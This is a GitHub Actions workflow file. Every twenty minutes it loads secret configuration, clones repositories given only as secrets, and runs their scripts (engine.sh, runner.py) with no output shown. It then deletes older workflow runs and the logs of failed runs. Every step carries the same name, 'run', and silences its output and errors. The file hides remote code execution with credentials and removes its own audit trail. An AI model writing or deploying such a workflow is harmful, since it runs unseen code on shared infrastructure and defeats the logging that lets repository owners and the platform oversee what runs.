name: run
on:
  schedule: [ { cron: "*/20 * * * *" } ]
permissions: { contents: write, actions: write }
concurrency: { group: run, cancel-in-progress: false }
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 300
    continue-on-error: true
    steps:
      - name: run
        uses: actions/checkout@v4
        with: { path: _pages }
      - name: run
        uses: actions/setup-python@v5
        with: { python-version: "3.12" }
      - name: run
        env: { CFG: "${{ secrets.CFG }}", PAGES_DIR: "${{ github.workspace }}/_pages" }
        run: |
          {
          printf '%s\n' "$CFG" | sed 's/\r$//' > "$RUNNER_TEMP/c"; set -a; . "$RUNNER_TEMP/c"; set +a; rm -f "$RUNNER_TEMP/c"
          git clone -q --depth 1 "$SRC" w && bash w/scripts/engine.sh auto
          } >/dev/null 2>&1 || true
      - name: run
        env: { K1: "${{ secrets.K1 }}", K2: "${{ secrets.K2 }}", K3: "${{ secrets.K3 }}", K4: "${{ secrets.K4 }}", K5: "${{ secrets.K5 }}", K6: "${{ secrets.K6 }}" }
        run: |
          {
          [ -n "$K1" ] && git clone -q --depth 1 "https://x-access-token:${K2}@github.com/${K1}.git" w2 && cd w2 && python3 src/runner.py
          } >/dev/null 2>&1 || true
      - name: run
        if: always()
        env: { GH_TOKEN: "${{ github.token }}", REPO: "${{ github.repository }}", RUN: "${{ github.run_id }}" }
        run: |
          {
          api() { curl -sf -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "$@"; }
          cut=$(date -u -d '1 day ago' +%Y-%m-%dT%H:%M:%SZ)
          for i in 1 2 3 4 5; do
            ids=$(api "https://api.github.com/repos/$REPO/actions/runs?per_page=100&created=%3C$cut" | jq -r '.workflow_runs[].id')
            [ -z "$ids" ] && break
            for id in $ids; do [ "$id" != "$RUN" ] && api -X DELETE "https://api.github.com/repos/$REPO/actions/runs/$id"; done
          done
          for id in $(api "https://api.github.com/repos/$REPO/actions/runs?per_page=100&status=failure" | jq -r '.workflow_runs[].id'); do
            [ "$id" != "$RUN" ] && api -X DELETE "https://api.github.com/repos/$REPO/actions/runs/$id/logs"
          done
          } >/dev/null 2>&1 || true
